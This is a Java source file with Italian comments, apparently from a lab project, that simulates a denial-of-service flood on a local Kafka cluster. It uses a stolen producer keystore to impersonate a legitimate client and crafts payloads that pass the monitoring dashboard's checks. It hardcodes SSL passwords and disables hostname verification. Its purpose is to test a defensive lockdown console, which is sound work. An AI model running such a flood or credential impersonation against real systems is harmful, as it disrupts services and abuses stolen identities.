package org.example.Sicurezza.SimulazioneAttacchi;

import org.apache.kafka.clients.producer.*;
import org.apache.kafka.common.serialization.StringSerializer;

import java.util.Properties;
import java.util.concurrent.atomic.AtomicLong;

/**
 * DoSAttacker - Attacco Denial of Service volumetrico.
 *
 * <p>Simula un flood di messaggi inviati con il keystore sottratto del producer
 * legittimo ({@code sicurezza/certs/OrderProducer.keystore.jks}). Il programma invia
 * messaggi in continuo, senza pause, fino a quando il broker non respinge un invio.
 *
 * <p><b>Comportamento atteso:</b>
 * <ul>
 *   <li>il payload rispetta i controlli strutturali e di sequenza della dashboard,
 *       quindi l'unica regola che scatta è quella volumetrica;</li>
 *   <li>quando il throughput supera 2000 msg/sec, la dashboard esegue il
 *       {@code GLOBAL LOCKDOWN}, applicando un DENY su {@code OrderProducer} e
 *       {@code OrderConsumer};</li>
 *   <li>il successivo invio viene respinto dal broker con
 *       {@code TopicAuthorizationException}, e il programma termina.</li>
 *   <li>dopo il DENY la dashboard può continuare a leggere messaggi: sono quelli
 *       già accettati dal broker prima del provvedimento. Il blocco impedisce
 *       nuove scritture, non la lettura della coda già presente.</li>
 * </ul>
 *
 * <p><b>Effetto collaterale:</b> il DENY colpisce l'identità del certificato, non il
 * processo. Il producer legittimo non può più scrivere finché non viene eseguito
 * RESTORE PERMISSIONS nella dashboard.
 *
 * <p><b>Prerequisiti:</b>
 * <ul>
 *   <li>dashboard avviata, con {@code Partizioni assegnate} nel log;</li>
 *   <li>RESTORE PERMISSIONS eseguito, così lo storico dei seq è vuoto
 *       e il flood parte da 1 senza replay;</li>
 *   <li>nessun altro producer attivo su {@code OrderProducer}, altrimenti
 *       la revoca può scattare in anticipo e il test è inquinato.</li>
 * </ul>
 *
 * @see org.example.Sicurezza.EnterpriseDefenseConsole
 */
public class DoSAttacker {

    /** Broker raggiungibili dal PC tramite le porte esposte da Docker. */
    private static final String BROKER_ENDPOINTS = "localhost:9093,localhost:9095,localhost:9096";

    /** Topic protetto monitorato dalla dashboard. */
    private static final String DEST_TOPIC = "secure-orders";

    /** Numero di messaggi accettati dal broker prima del blocco. */
    private static final AtomicLong deliveredPayloads = new AtomicLong(0L);

    /**
     * Sequenza crescente dei messaggi. Parte da 1: con lo storico della dashboard
     * azzerato (RESTORE PERMISSIONS) non si generano replay.
     */
    private static final AtomicLong seqCounter = new AtomicLong(0L);

    /**
     * Avvia il flood: invia messaggi in un ciclo infinito, senza attesa tra un invio e l'altro.
     * Il programma termina alla prima risposta di errore del broker.
     *
     * @param args non utilizzato
     */
    public static void main(String[] args) {
        System.setProperty("org.slf4j.simpleLogger.defaultLogLevel", "warn");

        System.out.println("\n========================================================");
        System.out.println("        STRESS TEST INJECTION - FLOOD ATTACK ACTIVE      ");
        System.out.println("========================================================");
        System.out.println("[SIMULATOR] Profilo: Credential Hijacking & Impersonation");
        System.out.println("[SIMULATOR] Target: " + DEST_TOPIC);

        Properties config = buildConfiguration();

        System.out.println("[SIMULATOR] Stato: Connessione stabilita. Invio flusso dati in corso...");

        @SuppressWarnings("resource")
        KafkaProducer<String, String> streamProducer = new KafkaProducer<>(config);

        try {
            while (true) {
                long seq = seqCounter.incrementAndGet();
                String payloadData = buildPayload(seq);

                // Invio asincrono: la callback gestisce il successo e l'errore di ogni messaggio
                streamProducer.send(
                        new ProducerRecord<>(DEST_TOPIC, "ATTACK_KEY", payloadData),
                        (metadata, error) -> handleDeliveryResult(error));
            }
        } catch (Exception ex) {
            System.err.println("\n\n[INTERRUZIONE] Flusso dati interrotto in modo anomalo.");
        }
    }

    /**
     * Costruisce un payload con la stessa struttura del producer legittimo, così da
     * superare i controlli strutturali della dashboard.
     *
     * @param seq numero di sequenza del messaggio
     * @return payload JSON con {@code ordine_id}, {@code seq} e {@code stato}
     */
    private static String buildPayload(long seq) {
        return String.format(
                "{\"ordine_id\": %d, \"seq\": %d, \"articolo\": \"FLOOD\", \"stato\": \"COMPLETED\"}",
                seq, seq);
    }

    /**
     * Gestisce l'esito di un invio. In caso di successo aggiorna il contatore e stampa
     * lo stato ogni 1000 messaggi. In caso di errore termina il programma, perché
     * il broker ha respinto l'identità.
     *
     * @param error eccezione restituita dal broker, {@code null} se l'invio è riuscito
     */
    private static void handleDeliveryResult(Exception error) {
        if (error == null) {
            long totalSent = deliveredPayloads.incrementAndGet();
            if (totalSent % 1000 == 0) {
                System.out.print("\r[STATISTICHE] Messaggi inoltrati con successo: " + totalSent);
            }
        } else {
            System.err.println("\n\n[AVVISO] Invio respinto dal broker dopo "
                    + deliveredPayloads.get() + " messaggi accettati.");
            System.err.println("Dettaglio: " + error.getClass().getSimpleName() + " - " + error.getMessage());
            System.exit(1);
        }
    }

    /**
     * Costruisce la configurazione del producer con il keystore sottratto.
     * Il truststore è quello comune del cluster. Le impostazioni ACKS=1 e LINGER_MS=0
     * massimizzano il ritmo di invio, al costo di una conferma meno forte.
     *
     * @return proprietà pronte per {@link KafkaProducer}
     */
    private static Properties buildConfiguration() {
        Properties config = new Properties();
        config.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, BROKER_ENDPOINTS);
        config.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());
        config.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());

        config.put("security.protocol", "SSL");
        config.put("ssl.truststore.location", "sicurezza/certs/kafka.truststore.jks");
        config.put("ssl.truststore.password", "KafkaSecurePass123");
        config.put("ssl.keystore.location", "sicurezza/certs/OrderProducer.keystore.jks");
        config.put("ssl.keystore.password", "KafkaSecurePass123");
        config.put("ssl.key.password", "KafkaSecurePass123");
        config.put("ssl.endpoint.identification.algorithm", "");

        config.put(ProducerConfig.ACKS_CONFIG, "1");
        config.put(ProducerConfig.LINGER_MS_CONFIG, "0");

        return config;
    }
}